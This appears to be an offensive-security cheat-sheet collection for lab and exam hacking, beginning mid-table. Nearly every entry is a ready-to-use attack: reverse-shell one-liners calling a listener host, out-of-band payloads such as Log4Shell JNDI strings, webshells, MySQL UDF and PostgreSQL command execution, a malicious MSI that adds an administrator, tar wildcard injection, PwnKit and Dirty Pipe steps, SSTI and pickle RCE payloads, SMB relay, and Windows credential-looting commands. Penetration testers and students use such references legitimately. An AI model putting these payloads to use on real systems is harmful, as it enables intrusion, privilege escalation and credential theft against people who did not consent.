| AS-REP roast | GetNPUsers -no-pass (user list) | no creds |
| Null/guest SMB shares | nxc smb -u '' -p '' --shares | no creds |
| LLMNR/NBT-NS capture | responder (in scope) | network access |
| Default / reused creds | nxc smb -u admin -p admin ; try found creds | sometimes none |
| Kerberoast | GetUserSPNs -request | any domain user |
| GPP cpassword in SYSVOL | find Groups.xml ; gpp-decrypt | any domain user |
| Readable LAPS / gMSA | nxc ldap --laps / gMSADumper | the right ACL |
| Creds in LDAP descriptions | ldapsearch ... description \| grep -i pass | any domain user |
| Spray a seasonal password | nxc smb -u users.txt -p 'Season2025!' --pass-pol first | user list |
| Local admin reuse (PtH) | nxc smb <subnet> -u admin -H <hash> --local-auth | one local hash |
| Unpatched DC | zerologon / nopac / printnightmare checks | network to DC |

## Then go deeper
If none hit, run BloodHound and work the ACL/delegation/ADCS paths (ad-full-walkthrough).

## Pattern
"AS-REP + null shares + default/reused creds + kerberoast + GPP/LAPS -> then BloodHound the graph."
(See: ad-full-walkthrough, kerberos-attacks-map, ad-enum-with-creds.)

entries.title: Out-of-band (OOB) callbacks for blind bugs
entries.brief: Confirming blind vulnerabilities with a DNS/HTTP callback you control
entries.body:
## Why OOB
Many bugs are **blind** — no output in the response. An out-of-band callback (a DNS/HTTP request to
a host you control) proves the code ran, even when you can't see the result. It's the reliable
confirm-before-exploit step.

## Your callback server
    interactsh-client            # prints a unique domain; shows any DNS/HTTP hit live
Or Burp Collaborator, or your own: `python3 -m http.server` + `tcpdump -i tun0`.

## Put the callback in the payload
| Bug | Payload uses your host for |
| --- | --- |
| Blind SSRF | url=http://<id>.oast.fun/ (see ssrf-logic) |
| Blind XXE | external DTD fetch + exfil (xxe-oob-blind) |
| Log4Shell | ${jndi:ldap://<id>.oast.fun/x} (log4shell-jndi) |
| Blind SQLi (OOB) | xp_dirtree / LOAD_FILE UNC / UTL_HTTP (blind-sqli) |
| Blind command injection | ; nslookup <id>.oast.fun / curl <id> |
| Java deserialization | URLDNS chain (java-deserialization) |
| SMTP/host-header | links/callbacks to your host |

## Read the hit
A DNS lookup alone confirms execution (and can exfil data in the subdomain label). HTTP hits can
carry data in the path/query.

## Pattern
"No output? point the payload at interactsh/Collaborator -> a DNS/HTTP hit proves it -> then
weaponise." (See: ssrf-logic, xxe-oob-blind, log4shell-jndi, blind-sqli.)

entries.title: Reverse shell cheat-sheet (catch, fire, stabilise)
entries.brief: The one-liners by language, and the flow from listener to a real TTY
entries.body:
## The flow
1. **Listen** on Kali. 2. **Fire** a reverse shell in a language the target has. 3. **Stabilise**
to a real TTY. Generate any of these with `oscp hacktools revshell $LHOST 4444`.

## 1. Catch it
    rlwrap -cAr nc -lvnp 4444          # arrow keys/history immediately (see rlwrap)
    socat file:`tty`,raw,echo=0 tcp-listen:4444   # fully interactive TTY out of the box

## 2. Fire it (pick what the target has)
    bash  : bash -i >& /dev/tcp/LHOST/4444 0>&1
    nc    : rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f
    python: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'
    perl  : perl -e 'use Socket;...exec("/bin/bash -i");'
    php   : php -r '$s=fsockopen("LHOST",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
    PowerShell: powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',4444);..."
    socat : socat tcp:LHOST:4444 exec:'bash -li',pty,stderr,setsid,sigint,sane
Egress filtered? use 443 or 53, or a bind shell, or pivot (oscp show pivot).

## 3. Stabilise (the sequence)
    python3 -c 'import pty;pty.spawn("/bin/bash")'   # in the shell
    Ctrl-Z ; stty raw -echo; fg                        # on Kali, regain raw mode
    export TERM=xterm; stty rows 50 cols 200           # back in the shell

## Pattern
"listen (rlwrap/socat) -> fire the right-language one-liner -> python pty + stty raw -echo; fg ->
set TERM/size." (See: foothold-logic, shell-tty, hacktools revshell/listener.)

entries.title: Stabilise a reverse shell — full interactive TTY
entries.brief: Turn a dumb nc shell into a real terminal (tab-complete, Ctrl-C, nano/ssh, arrow keys)
entries.body:
## Why
A raw `nc` shell has no job control: Ctrl-C kills it, there's no tab-completion, and `sudo`,
`ssh`, `su` or `nano` break. Upgrade it to a proper PTY before you do anything else.

## Step 1 — spawn a PTY (pick what the box has)
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # or: script -qc /bin/bash /dev/null
    # or: perl -e 'exec "/bin/bash";'

## Step 2 — background and fix your local terminal
    Ctrl-Z                 # background the shell
    stty raw -echo; fg     # (on YOUR Kali) then press Enter twice

## Step 3 — set term type + size
    export TERM=xterm-256color
    stty rows 50 cols 200  # match your window (get values with `stty size` on Kali)

## The clean alternative — use a PTY-aware listener
Skip the dance entirely with a smart catcher (see the **pwncat-cs** and **rlwrap** atlas entries):
    rlwrap nc -lvnp 443    # arrow keys + history even on a dumb shell
    pwncat-cs -lp 443      # auto-stabilises, adds upload/download, persistence helpers

## Windows note
There's no TTY to upgrade; use `ConPtyShell`, `evil-winrm`, or a Meterpreter session for
interactivity. For simple shells, prefer a **nc.exe** or a WinRM session over raw cmd.

## Gotchas
- Forgot `stty raw -echo`? Ctrl-C still kills the shell — redo step 2.
- After `fg`, if the prompt looks doubled, run `reset` or `export TERM=xterm`.
- Window resized? re-run the `stty rows/cols` line or the display wraps wrong.

entries.title: Host discovery when ping is blocked
entries.brief: Find live hosts on a subnet even when ICMP is filtered — the first step before port scans
entries.body:
## The problem
Firewalls often drop ICMP, so a plain ping sweep shows an empty network that's actually full.
Discovery has to fall back to ARP (same L2) or TCP/UDP probes.

## Same subnet (layer 2) — most reliable
    sudo arp-scan -l                     # ARP sweep of the local net
    sudo netdiscover -r 10.10.10.0/24    # passive/active ARP
    nmap -sn -PR 10.10.10.0/24           # nmap ARP ping (local only)

## Routed / across the VPN — probe TCP/UDP, skip ping
    nmap -sn -PS22,80,443,445,3389 10.10.10.0/24   # TCP SYN ping to common ports
    nmap -sn -PE -PP -PM 10.10.10.0/24             # ICMP echo/timestamp/netmask
    nmap -Pn -p 80,443,445 --open 10.10.10.0/24    # skip discovery, just scan

## Fast sweeps
    fping -a -g 10.10.10.0/24 2>/dev/null          # list responders
    for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i >/dev/null && echo 10.10.10.$i &); done

## Key rule
On exam/lab targets that 'don't respond', add `-Pn` so nmap treats the host as up and scans
anyway — a filtered ICMP does NOT mean the ports are closed. See **recon-first-commands-by-port**.

## Gotchas
- ARP only works on your own broadcast domain — useless across the VPN/router.
- `-Pn` on a whole /24 is slow; narrow to discovered hosts first.

entries.title: PHP filter chains — LFI to RCE with no file upload
entries.brief: Turn a php://filter-reachable LFI/include into code execution using filter-chain generators
entries.body:
## The idea
When a PHP app does `include($_GET['page'])` (or similar) and you can reach `php://filter`,
you can **synthesise arbitrary bytes** out of chained conversion filters — no writable file,
no log poisoning needed. The output of the chain becomes PHP that the `include` then runs.

## When it applies
- A confirmed LFI / file-include sink that accepts `php://filter/...` wrappers.
- `allow_url_include` is NOT required (unlike `php://input` / `data://`).
- Great on OSWE-style boxes and CTFs where classic LFI2RCE paths are closed.

## Generate the chain
    git clone https://github.com/synacktiv/php_filter_chain_generator
    python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'
Paste the emitted `php://filter/convert...|...resource=php://temp` string into the vulnerable
parameter, then append your command:
    http://target/?page=php://filter/...<GENERATED>...&0=id

## Why it works
Each `convert.iconv.*` step reshapes bytes; stacked correctly they build your PHP payload at
the front of the stream, which `include` executes. You never touch the filesystem.

## Related
- data:// and php://input wrappers (need allow_url_include) — see **file-upload-bypass** / LFI notes.
- Log poisoning / session file include are the fallbacks when filters are blocked.

## Gotchas
- The chain is long; some WAFs/length limits truncate it — see **sqli-waf-bypass** tactics.
- Only works where `php://filter` is reachable; a str_replace stripping `php://` kills it.

entries.title: WordPress — enum to RCE
entries.brief: The reliable WordPress kill-chain: enumerate, get creds, then admin-to-code-execution
entries.body:
## 1. Enumerate
    wpscan --url http://target -e vp,vt,u --api-token <WPVULNDB>   # vuln plugins/themes, users
    curl -s http://target/wp-json/wp/v2/users | jq               # user enum via REST API
    # readme.html / wp-includes/version.php often leak the core version

## 2. Get credentials
    wpscan --url http://target -U users.txt -P rockyou.txt        # xmlrpc/login brute
    # xmlrpc multicall makes brute MUCH faster if /xmlrpc.php is open
A vulnerable plugin may give auth bypass / arbitrary file read before you ever need a password.

## 3. Admin -> RCE (several paths)
- **Theme editor**: Appearance -> Theme Editor -> edit 404.php to `<?php system($_GET[c]);?>`,
  then hit `/wp-content/themes/<theme>/404.php?c=id`.
- **Upload a malicious plugin**: zip a plugin with a webshell header, Plugins -> Add New -> Upload.
- **Vulnerable plugin RCE**: search the exact plugin+version:
    searchsploit wordpress <plugin>

## 4. After the shell
Loot DB creds from `wp-config.php` (DB_USER/DB_PASSWORD) — reuse them for the DB and for
password-spraying other services. See **active-directory-quick-wins** / **mysql-udf-privesc**.

## Gotchas
- wpscan user enum is often blocked; the REST `/wp-json/wp/v2/users` route frequently still works.
- Theme-editor writes fail if the filesystem is read-only -> use the plugin-upload path instead.

entries.title: MySQL/MariaDB UDF — DB service to root
entries.brief: When MySQL runs as root, a user-defined function (raptor/lib_mysqludf_sys) gives command exec
entries.body:
## When it applies
- You have MySQL credentials with `INSERT`/`FILE` on `mysql` (often root@localhost reuse).
- The **mysqld process runs as root** (common on misconfigured boxes) — then UDF exec = root.
Check: `SELECT @@version, @@plugin_dir;` and `ps aux | grep mysqld`.

## The classic path (lib_mysqludf_sys / raptor)
    # find the prebuilt or compile lib_mysqludf_sys.so
    locate lib_mysqludf_sys.so   # ships with Metasploit/exploitdb
    # inside MySQL, load it into the plugin dir and register the function
    use mysql;
    create table foo(line blob);
    insert into foo values(load_file('/path/lib_mysqludf_sys.so'));
    select * from foo into dumpfile '/usr/lib/mysql/plugin/udf.so';
    create function sys_exec returns int soname 'udf.so';
    select sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
    \! /tmp/rootbash -p

## Simpler wins first
- If you only need file read/write (not root), use `LOAD_FILE()` / `INTO OUTFILE` — see **sqli-to-rce**.
- `searchsploit mysql udf` for ready PoCs; MySQL raptor_udf2.c is the compile-it-yourself version.

## Gotchas
- Fails if mysqld runs as the low-priv `mysql` user — you only get that user, not root.
- `secure_file_priv` or a read-only plugin dir blocks the dumpfile write.
- Verify the plugin dir from `@@plugin_dir`; writing elsewhere won't load.

entries.title: PostgreSQL — superuser to command execution
entries.brief: COPY ... TO/FROM PROGRAM, large-object file write, and the archive_command path on Postgres
entries.body:
## When it applies
You have a PostgreSQL login that is (or can become) **superuser**. Check with `\du` or
`SELECT usesuper FROM pg_user WHERE usename=current_user;`.

## COPY ... PROGRAM (9.3+) — the easy one
    DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text);
    COPY cmd_exec FROM PROGRAM 'id';
    SELECT * FROM cmd_exec;        -- read the command output back
    -- one-off, no output needed: COPY (SELECT '') TO PROGRAM 'bash -c "..."';

## Read/write files
    CREATE TABLE f(t text); COPY f FROM '/etc/passwd'; SELECT * FROM f;   -- read
    COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/sh.php';   -- write webshell

## Via tooling
    impacket's / Metasploit's postgres modules automate COPY-PROGRAM; also:
    searchsploit postgresql copy

## Not superuser?
- Look for the `pg_read_server_files` / `pg_execute_server_program` roles (grant RCE/read without full super).
- Dump creds from tables and `password-spray` other services instead — see **sqli-to-rce**.

## Gotchas
- COPY PROGRAM runs as the `postgres` OS user, not root — chain to **linpeas** for the next hop.
- Output tables persist; clean up (`DROP TABLE`) on real engagements.

entries.title: AlwaysInstallElevated — MSI privesc
entries.brief: Two registry keys that let any user install an MSI as SYSTEM — a quick Windows local privesc
entries.body:
## The misconfig
If **both** of these are set to 1, any user can run an MSI that executes as SYSTEM:
    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Both must equal 0x1. winPEAS and PowerUp flag this automatically.

## Exploit
    # build a malicious MSI (adds a local admin, or runs your payload)
    msfvenom -p windows/x64/exec CMD='net user hacker P@ss123! /add & net localgroup administrators hacker /add' -f msi -o evil.msi
    # on the target:
    msiexec /quiet /qn /i C:\Windows\Temp\evil.msi

## Verify / enumerate
    PowerUp.ps1  -> Get-UnattendedInstallFile / Get-RegistryAlwaysInstallElevated
    winpeas.exe  -> 'AlwaysInstallElevated' section

## Gotchas
- Only ONE key set to 1 is NOT exploitable — you need both HKCU and HKLM.
- Prefer adding a user or a reverse shell over interactive payloads under `/quiet`.
- AV may flag a msfvenom MSI; a custom WiX/CustomAction MSI evades signature checks.

entries.title: Apache Struts 2 — OGNL injection RCE
entries.brief: The Struts CVE family (S2-045/CVE-2017-5638 and friends) — OGNL in headers/params to RCE
entries.body:
## Spot it
Java app, URLs ending in `.action` / `.do`, or Content-Type parsing errors. Fingerprint:
    whatweb http://target ; curl -si http://target/index.action
    searchsploit struts

## CVE-2017-5638 (S2-045) — Content-Type header
The Jakarta multipart parser evaluates OGNL in a malformed `Content-Type` header. The public
gadget sets `#_memberAccess` to the default context, then runs an OGNL command block. Rather
than hand-building (and mistyping) that gadget, drive a maintained PoC and start with `id`:
    git clone <struts-pwn repo> ; python3 struts-pwn.py --url http://target -c id

## Other Struts bugs you'll meet
- **S2-057 (CVE-2018-11776)**: OGNL via namespace/URL when config is loose.
- **S2-048 / S2-053**: OGNL in Struts showcase / Freemarker tags.
Each has a public PoC — match the exact Struts version with `searchsploit`.

## After RCE
You land as the app-server user (often `tomcat`). Enumerate for the next hop with **linpeas**,
and loot DB creds from the app config. See **tomcat-exploitation** for manager-based paths.

## Gotchas
- Blind? Redirect output to a web-reachable file, or use an **oob-callbacks** DNS/HTTP canary.
- WAFs filter `%{` and `@java` — see **waf-evasion** for OGNL obfuscation.

entries.title: SMB relay — forward NetNTLM to a target that doesn't sign
entries.brief: Relay poisoned authentication to another host for a shell, hashes, or command exec
entries.body:
## Precondition
The **target** must have SMB signing NOT enforced, and the relayed account must be a local admin
there. Find candidates first:
    nxc smb 10.10.10.0/24 --gen-relay-list relay.txt   # hosts with signing:False

## Set it up
1. In Responder.conf set `SMB = Off` and `HTTP = Off` (so Responder poisons but doesn't catch).
2. Start the relay:
    impacket-ntlmrelayx -tf relay.txt -smb2support            # dumps SAM by default
    impacket-ntlmrelayx -t smb://10.10.10.15 -smb2support -i  # -i = interactive SMB client
    impacket-ntlmrelayx -t smb://10.10.10.15 -c 'powershell -enc ...'  # run a command
3. Start Responder (or use mitm6 for IPv6 DNS takeover) to coerce the auth.

## What you get
- `-i` gives an SMB session as the relayed user; `--dump-sam`/default dumps local hashes.
- With a Domain Admin relayed, `--escalate-user` / LDAP targets open more paths.

## Related
- Coerce auth on demand with **coercion-techniques** (PetitPotam/PrinterBug) instead of waiting.
- mitm6 + ntlmrelayx to LDAP is the classic IPv6 takeover — see **ipv6-dns-takeover** if present.

## Gotchas
- You cannot relay an account back to the SAME host it came from (reflection is patched).
- Signing enforced on the target = relay fails; fall back to cracking the hash.

entries.title: PATH hijacking — abuse relative binaries in SUID/sudo programs
entries.brief: When a privileged program calls a command without a full path, drop your own first on PATH
entries.body:
## The idea
A SUID binary or sudo-allowed script that runs e.g. `system("service ...")` or calls `ps`, `cp`,
`tar` **without an absolute path** resolves it via `$PATH`. If you can prepend a directory you
control, your fake binary runs with the program's privileges.

## Find the call
    strings /path/suid_binary | grep -iE 'system|exec|popen|/bin/'   # look for bare command names
    ltrace /path/suid_binary 2>&1 | grep -iE 'system|exec'           # confirm at runtime

## Exploit
    cd /tmp
    echo -e '#!/bin/bash\n/bin/bash -p' > service   # name = the command it calls
    chmod +x service
    export PATH=/tmp:$PATH
    /path/suid_binary        # it runs ./service as root -> rootbash

## sudo variant
If `sudo -l` shows a script you can run that calls bare commands, and `secure_path` is NOT set
(or the rule preserves your env), the same PATH trick works for that sudo command.

## Gotchas
- `sudo` usually resets PATH via `secure_path` in sudoers — check `sudo -l` output.
- Shells drop privileges on SUID; hence `/bin/bash -p` (keeps euid). dash/`-p` behaves similarly.
- Full paths in the target (`/usr/sbin/service`) defeat this — look for the bare ones.

entries.title: Cron + wildcard injection — tar/rsync/chown argument abuse
entries.brief: A root cron running `tar *` (or rsync/chown) in a writable dir becomes command execution
entries.body:
## Spot it
    cat /etc/crontab ; ls -la /etc/cron.*        # root jobs
    pspy64                                        # catch jobs you can't read
Look for a root job that runs a command with a **wildcard** in a directory **you can write**:
    cd /some/writable/dir && tar czf /backup/all.tgz *

## Why it's exploitable
The shell expands `*` to filenames BEFORE tar sees them. Create files whose NAMES are tar options
(`--checkpoint`, `--checkpoint-action=exec=...`) and tar runs your command as root.

## tar checkpoint exploit
    cd /some/writable/dir
    echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > runme.sh ; chmod +x runme.sh
    touch -- '--checkpoint=1'
    touch -- '--checkpoint-action=exec=sh runme.sh'
    # wait for the cron tick, then:
    /tmp/rb -p

## Other wildcard sinks
- **rsync**: a file named `-e sh runme.sh` abuses the remote-shell option.
- **chown/chmod**: `--reference=file` lets you copy ownership/mode from a file you control.

## Gotchas
- Needs write access to the exact dir the job `cd`s into with the bare `*`.
- GTFOBins has the per-binary wildcard payloads — see **gtfobins-logic**.

entries.title: PwnKit (CVE-2021-4034) — pkexec local root
entries.brief: A memory-corruption in pkexec gives instant local root on most 2009-2022 Linux installs
entries.body:
## What it is
CVE-2021-4034: `pkexec` (SUID, part of polkit) mishandles argc=0, letting an unprivileged user
inject an environment variable that runs code as **root**. Affected virtually every distro from
2009 until the Jan-2022 patch — a very reliable OSCP/HTB privesc when the box is unpatched.

## Check first
    ls -l $(which pkexec)                 # present + SUID?
    pkexec --version                      # polkit version
    dpkg -l | grep -i policykit           # patched builds note the CVE fix

## Exploit
    searchsploit pwnkit                    # or clone a known PoC (ly4k/PwnKit, berdav/CVE-2021-4034)
    gcc cve-2021-4034.c -o pwnkit && ./pwnkit    # some PoCs are single self-contained binaries
    # success -> instant root shell (id = uid=0)

## Why it's a go-to
No special config needed (unlike sudo/cron misconfigs) — just an unpatched pkexec. Works even
when polkit's daemon is not running.

## Gotchas
- Patched systems log an abuse attempt (`The value for the SHELL variable...`) — noisy if patched.
- Compile ON the target or match its arch/glibc; a mismatched binary just segfaults.
- If pkexec was removed/hardened, pivot to kernel exploits — see **kernel-exploits** / LES.

entries.title: Dirty Pipe (CVE-2022-0847) — overwrite read-only files to root
entries.brief: A Linux 5.8–5.16 pipe bug lets you write into files you can only read — classic root paths
entries.body:
## What it is
CVE-2022-0847: a flaw in the kernel pipe/`splice` machinery lets an unprivileged user **write**
into pages of files they only have **read** access to. Affects Linux 5.8 through 5.16.11
(and the 5.15.25 / 5.10.102 stable branches below it). Check your version with `uname -r`.

## Two standard escalation paths
- **Overwrite /etc/passwd**: blank root's password field (or inject a known hash) then `su root`.
- **Hijack a SUID binary**: patch a root-owned SUID to run your shellcode/command — PoCs that take
  a SUID path do this for you.

## Exploit
    uname -r                               # confirm 5.8–5.16.x, unpatched
    searchsploit dirty pipe                # or clone AlexisAhmed/CVE-2022-0847 / the-dirty-pipe PoCs
    gcc exploit.c -o dp && ./dp            # passwd-overwrite variant, or ./dp /usr/bin/su (SUID variant)

## Gotchas
- Back up the target file first — a bad offset can corrupt /etc/passwd and lock you out.
- Kernel in range but behaving? distros backport fixes — verify the exact patch level.
- Out of range? see **kernel-exploits**, PwnKit (**polkit-pwnkit**), or config-based privesc first.

entries.title: OS command injection — detection and filter bypass
entries.brief: Confirm command injection (incl. blind) and get past spaces, keyword and character filters
entries.body:
## Detect
Inject shell separators into any parameter that looks like it hits the OS:
    ; id    | id    & id    `id`    $(id)    %0a id    newline
Blind? Use time or out-of-band:
    ; sleep 5          # time-based
    ; ping -c1 $(id).ATTACKER.oast.site   # OOB DNS — see oob-callbacks / interactsh

## Space bypass (when spaces are filtered)
    cat${IFS}/etc/passwd          # $IFS
    {cat,/etc/passwd}             # brace expansion
    cat</etc/passwd               # redirection
    X=$'\x20';cat$X/etc/passwd    # build a space

## Keyword / blacklist bypass
    c''at /etc/passwd   ;   c\at /etc/passwd        # break the word with quotes/escapes
    /???/c?t /e??/p??swd                            # globbing
    echo d2hvYW1p | base64 -d | sh                 # encode the command, decode at runtime

## Get a shell
Once confirmed, feed a reverse shell (URL-encode it). See **reverse-shell-cheatsheet** and
**waf-evasion** for heavier filtering.

## Gotchas
- Match the separator to the context: `;` fails inside quotes — try `"; id;"` or `' ; id ; '`.
- Windows uses `&`, `&&`, `|`; swap `ping -n` for `ping -c` on time tests.
- WAF blocking `/bin/bash`? the globbing/`$IFS`/encode tricks above usually slip through.

entries.title: SSTI to RCE — per-engine payloads
entries.brief: Identify the template engine, then jump from expression evaluation to command execution
entries.body:
## 1. Detect + fingerprint
Inject `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}` — a `49` means SSTI. Branch by what renders:
    {{7*7}}=49 and {{7*'7'}}=7777777 -> Jinja2/Twig ; ${7*7}=49 -> Freemarker/Velocity/Spring
PortSwigger's decision tree (polyglot `${{<%[%'\"}}%\\`) narrows the engine fast.

## 2. Engine -> RCE
**Jinja2 (Python/Flask)**:
    {{ cycler.__init__.__globals__.os.popen('id').read() }}
    {{ ''.__class__.__mro__[1].__subclasses__()[XXX](...) }}   # find Popen's index
**Twig (PHP)**:
    {{ ['id']|filter('system') }}   or   {{ _self.env.registerUndefinedFilterCallback('system') }}
**Freemarker (Java)**:
    <#assign ex='freemarker.template.utility.Execute'?new()>${ ex('id') }
**Velocity (Java)**:
    #set($e=$x.class.forName('java.lang.Runtime').getRuntime().exec('id'))

## 3. Tooling
    tplmap -u 'http://t/?q=*'        # automates detect + exploit (see atlas: tplmap)
    # SSTImap is the maintained successor

## Gotchas
- Sandboxed engines (Twig sandbox, Jinja SandboxedEnvironment) block the easy paths — hunt for an
  unsandboxed gadget or a bypass for that version.
- `{{7*7}}` reflected but not evaluated = just reflection/XSS, not SSTI. See **ssti-logic** for the method.

entries.title: Where credentials hide on Windows
entries.brief: The reliable spots to loot passwords after a Windows foothold — files, registry, prefs
entries.body:
## The idea
After a shell, creds are often sitting in files and registry keys before you ever touch LSASS.
Sweep these first — winPEAS/Seatbelt automate most, but know them by hand.

## Unattended-install / provisioning files
    dir /s /b C:\unattend.xml C:\Windows\Panther\Unattend.xml sysprep.inf sysprep.xml
    # Base64 'Password' values -> decode

## Registry autologon + stored creds
    reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v DefaultPassword
    reg query HKLM /f password /t REG_SZ /s      # brute the hive for 'password'
    cmdkey /list                                 # saved runas/RDP creds (use with runas /savecred)

## Group Policy Preferences (cPassword) — AES key is public
    findstr /S /I cpassword \\DC\SYSVOL\*.xml   # then gpp-decrypt (see atlas: gpp-decrypt)

## App / config files & history
    web.config, *.config, *.ini, *.kdbx, *.ppk, .git-credentials, PowerShell ConsoleHost_history.txt
    dir /s /b *pass* *cred* *.config 2>nul ; type %APPDATA%\..\..\ (browser profiles)

## Then go for memory/SAM
If files come up empty, dump SAM/LSASS or saved secrets — see **lsass-dump-methods** /
**sam-system-dump** (if present), **mimikatz**, **lazagne**, **dploot**.

## Gotchas
- cPassword GPP is read-only to any domain user via SYSVOL — a classic easy domain cred.
- `cmdkey /list` shows creds exist but not the value; use `runas /savecred` to leverage them.
- PowerShell history (`ConsoleHost_history.txt`) frequently leaks a typed-in password.

entries.title: MSSQL linked servers — lateral movement through the database tier
entries.brief: Hop between SQL Servers via linked-server trust, then xp_cmdshell on the far end
entries.body:
## The idea
SQL Servers often trust each other via **linked servers**. A low-priv login on SERVER_A may map
to a high-priv login on SERVER_B — letting you run queries (and sometimes OS commands) remotely.

## Enumerate the links
    EXEC sp_linkedservers;                     -- list linked servers
    SELECT srvname, isremote FROM sysservers;   -- same, older
    -- who am I on the far side?
    EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [SERVER_B];

## Query / chain across the link
    EXEC ('SELECT name FROM master.sys.databases') AT [SERVER_B];
    -- links can be chained A -> B -> C by nesting OPENQUERY/EXEC-AT

## To OS command on the far server (if sysadmin there)
    EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE;
          sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [SERVER_B];
    EXEC ('xp_cmdshell ''whoami''') AT [SERVER_B];

## Tooling
    impacket-mssqlclient user:pass@HOST   # then enum_links / use_link
    nxc mssql HOST -u u -p p -q '...'     # scripted; PowerUpSQL Get-SQLServerLinkCrawl (on Windows)

## Gotchas
- The far-side context depends on the link's security mapping — check with SYSTEM_USER AT [B].
- `EXEC(...) AT` needs RPC-out enabled on the link; OPENQUERY is the fallback for SELECTs.
- See **mssql-abuse** for single-host xp_cmdshell/impersonation first.

entries.title: Dangerous Windows privileges — a token/privesc map
entries.brief: Which SeXxxPrivilege gets you SYSTEM and the standard technique for each (reference)
entries.body:
## How to read your token
    whoami /priv            # list held privileges (Enabled or Disabled both count if you can enable)
A service account (IIS, MSSQL, scheduled task) often holds one of these even as a 'low' user.

## The map (privilege -> standard abuse)
- **SeImpersonate / SeAssignPrimaryToken** -> Potato family (coerce a SYSTEM auth, impersonate it).
  Typical on service accounts. See **windows-potato-attacks**.
- **SeBackup / SeRestore** -> read any file: copy SAM+SYSTEM hives (or NTDS on a DC) and extract.
  See **backup-operators-privesc**.
- **SeDebug** -> open any process: dump LSASS for creds (see **lsass-dump** methods).
- **SeTakeOwnership** -> take ownership of a protected file/registry key, then rewrite it.
- **SeLoadDriver** -> load a vulnerable signed driver (BYOVD) for kernel-level escalation.
- **SeManageVolume** -> gain broad filesystem write via volume maintenance.

## Enumerate helpers
    whoami /priv ; winpeas.exe ; PowerUp.ps1 (Invoke-AllChecks) ; accesschk.exe

## Gotchas
- A privilege shown 'Disabled' is usually still usable — the process can enable held privileges.
- Match the Potato variant to the OS build (JuicyPotato is dead on newer Windows; use the modern
  variants) — see **windows-potato-attacks** for the current chooser.
- These are abuse-of-granted-rights references, not exploits; they need the privilege to be held.

entries.title: LAPS — reading managed local-admin passwords
entries.brief: When your principal has the right to read ms-Mcs-AdmPwd, LAPS hands you local admin
entries.body:
## What LAPS is
LAPS randomises each machine's local Administrator password and stores it in AD on the computer
object (`ms-Mcs-AdmPwd`). The password is cleartext in AD — readable by whoever has the ACL.
The whole attack is an **enumeration/read**: find who can read it, then read it.

## Find LAPS + who can read it
    # BloodHound: 'ReadLAPSPassword' edge to a computer you can reach
    nxc ldap DC -u u -p p -M laps              # dump readable LAPS passwords
    pyLAPS.py --action get -d corp.local -u u -p p

## Read it directly over LDAP
    ldapsearch -x -H ldap://DC -D 'u@corp.local' -w pass -b 'dc=corp,dc=local' \
      '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
    # Windows LAPS (newer): attribute is msLAPS-Password (JSON)

## Use it
The value IS the local admin password for that host -> **pass-the-password** / evil-winrm / psexec:
    nxc smb HOST -u administrator -p '<LAPS-pw>' --local-auth

## Gotchas
- `--local-auth`: LAPS is the LOCAL admin, not a domain account.
- No read ACL = no password; the attack is entirely about the delegated read right (check BloodHound).
- Expired/rotated: `ms-Mcs-AdmPwdExpirationTime` tells you if it's current.

entries.title: Host header injection — reset poisoning, routing, cache
entries.brief: Abuse a trusted-but-attacker-controlled Host header for account takeover and more
entries.body:
## The idea
Apps that build URLs/links from the incoming `Host` (or `X-Forwarded-Host`) header let you point
them at your domain. The classic impact is **password-reset poisoning**: the reset link in the
victim's email contains YOUR host, so the token leaks to you when they (or you) click.

## Probe
    GET /reset HTTP/1.1
    Host: evil.attacker.com                 # does the reset email/link use this?
    # or keep the real Host and add:
    X-Forwarded-Host: evil.attacker.com
    X-Host: evil.attacker.com

## What to look for
- **Reset poisoning**: trigger a reset for a victim; if the token lands on your host's logs, use it.
- **Routing / vhost confusion**: a spoofed Host reaching an internal vhost or admin panel.
- **Web-cache poisoning**: an unkeyed Host reflected into a cached response (see **web-cache-poisoning**).
- **SSRF-ish**: Host used to build a server-side request.

## Tooling
    # Burp: Param Miner finds unkeyed/secret headers; collaborator catches the callback
    # Manually watch your HTTP log for the poisoned link hit

## Gotchas
- A duplicate Host header or an absolute request-line URI can bypass naive validation.
- Reset poisoning needs the app to EMAIL a link built from Host — verify in the received mail.
- See **oob-callbacks** to confirm blind server-side use of the header.

entries.title: Python deserialization — pickle / PyYAML to RCE
entries.brief: Untrusted pickle.loads or yaml.load runs attacker code — craft the __reduce__ gadget
entries.body:
## The idea
`pickle.loads()` on attacker data is RCE by design: a pickle can carry a `__reduce__` that Python
calls on load. Same class of bug in `yaml.load` (without SafeLoader), `jsonpickle`, and some
`__reduce__`-capable caches/sessions.

## Spot it
- A cookie/param/upload that base64-decodes to pickle opcodes (starts with `\x80` / `(c...`).
- Code doing `pickle.loads(request...)`, `yaml.load(x)` (old PyYAML), `cPickle`, `shelve`, `dill`.

## Pickle RCE payload
    import pickle, base64, os
    class E:
        def __reduce__(self): return (os.system, ('id > /tmp/o',))
    print(base64.b64encode(pickle.dumps(E())).decode())
    # send the blob where the app will pickle.loads() it

## PyYAML (pre-SafeLoader / yaml.load default)
    !!python/object/apply:os.system ['id']
    # or !!python/object/new:... for constructor gadgets

## Gotchas
- `yaml.safe_load` / `pickle` on trusted data only = not exploitable; you need untrusted input.
